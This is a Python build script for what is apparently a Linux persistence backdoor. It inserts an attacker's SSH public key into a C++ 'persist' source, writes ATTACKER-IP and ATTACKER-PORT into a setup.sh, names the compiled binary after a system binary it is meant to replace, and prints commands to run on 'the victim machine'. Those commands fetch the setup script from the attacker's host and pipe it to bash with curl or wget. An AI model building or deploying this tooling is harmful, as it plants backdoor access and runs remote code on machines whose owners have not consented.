"""
Make me life easier ;P
"""

import os
import argparse

"""
{SSH-KEY} == SSH-KEY public for the user - Edited in the cpp file
{NAME-OF-BIN} == The binary that needs to be replaced - Used while compilation
{ATTACKER-IP} == The attackers IP - Edited in the plant.sh
{ATTACKER-PORT} == The attackers port - Edited in the plant.sh 
"""

def main():
    # Parse args
    parser = argparse.ArgumentParser(description='Gimme the deets')
    parser.add_argument("-i", "--ip_addr", action='store', type=str, required=True)
    parser.add_argument("-p", "--port",action='store', type=str, required=True)
    parser.add_argument("-s", "--ssh_pub",action='store', type=str, required=True)
    parser.add_argument("-b", "--binary_name",action='store', type=str, required=True)
    args = parser.parse_args()
    cpp_ready(args)
    setup_ready(args)
    compile(args)

def cpp_ready(args):
    # Open the persist and read in the contents 
    cpp_file = open("src/persist.cpp", "r")
    read_cpp_file = cpp_file.read()
    cpp_file.close()

    # Open the ssh file name and do things
    ssh_file = open(args.ssh_pub,"r")
    ssh_file_read = ssh_file.read() 
    updated_contents = read_cpp_file.replace("{SSH-KEY}", ssh_file_read.strip("\n"))
    ssh_file.close()
    
    # open the file that will be compiled with the updated data
    cpp_file = open(f"out/{args.binary_name}.cpp", "w")
    cpp_file.write(updated_contents)
    cpp_file.close()

def setup_ready(args):
    # Prepare the setup.sh file
    setup_sh = open("src/setup.sh", "r")
    data = setup_sh.read()
    setup_sh.close()
    
    # Prepare the data
    data = data.replace("{ATTACKER-PORT}", args.port)
    data = data.replace("{ATTACKER-IP}", args.ip_addr)
    data = data.replace("{NAME-OF-BIN}", args.binary_name)

    # Out
    setup_out = open("out/setup.sh", "w")
    setup_out.write(data)
    setup_out.close()

def compile(args):
    os.system(f"g++ out/{args.binary_name}.cpp -o out/{args.binary_name} -w")
    print("[+] The binary is ready")
    print(f"[+] Run the following command on the victim machine:\ncurl {args.ip_addr}:{args.port}/setup.sh | bash \nOR\nwget {args.ip_addr}:{args.port}/setup.sh && bash setup.sh")

if __name__ == "__main__":
    main()
